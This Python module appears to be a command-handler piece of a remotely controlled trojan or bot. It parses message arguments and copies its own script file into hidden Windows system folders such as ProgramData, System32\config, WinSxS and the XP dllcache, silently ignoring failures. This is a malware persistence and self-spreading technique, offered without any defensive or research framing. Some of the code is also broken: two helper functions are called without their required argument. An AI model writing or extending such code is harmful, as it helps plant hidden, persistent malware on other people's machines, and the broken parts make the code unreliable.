import os
import shutil

WIN8 = [
    r"C:\Users\<username>\AppData\LocalLow",
    r"C:\ProgramData",
    r"C:\Windows\Installer",
    r"C:\Windows\System32\config",
    r"C:\Windows\WinSxS"
]

WINXP = [
    r"C:\Documents and Settings\All Users\Application Data",
    r"C:\WINDOWS\Downloaded Program Files",
    r"C:\WINDOWS\Tasks",
    r"C:\WINDOWS\system32\dllcache",
    r"C:\Documents and Settings\<username>\Local Settings\Temporary Internet Files"
]

def see_winxp_dirs(_): return "\n".join(WINXP)

def see_win8_dirs(_): return "\n".join(WIN8)

def get_dirs(message):
    try:
        machine = message.split(" ")[1]
        if machine == "8" or machine == "server": return see_win8_dirs()
        elif machine == "xp": return see_winxp_dirs()
        else: return f"Invalid machine name: {machine}"
    except Exception as e: return f"Error in get_dirs(): {e}"

def copy_to_dir(dir):
    shutil.copy2(__file__, dir)
    return f"Successfully copied script to {dir}."

def copy_default(message):
    try:
        machine = message.split(" ")[1]
        if machine == "8" or machine == "server":
            for target in WIN8:
                try:
                    copy_to_dir(target)
                except: pass
            return f"Successful Copy"
        elif machine == "xp":
            for target in WINXP:
                try: copy_to_dir(target)
                except: pass
            return f"Successful Copy"
        else: return f"Invalid machine name: {machine}"
    except Exception as e: return f"Error in copy_default(): {e}"

def copy_dir_msg(message):
    try:
        target = message.split(" ")[1]
        return copy_to_dir(target)
    except Exception as e: return f"Error in copy_dir_msg(): {e}"
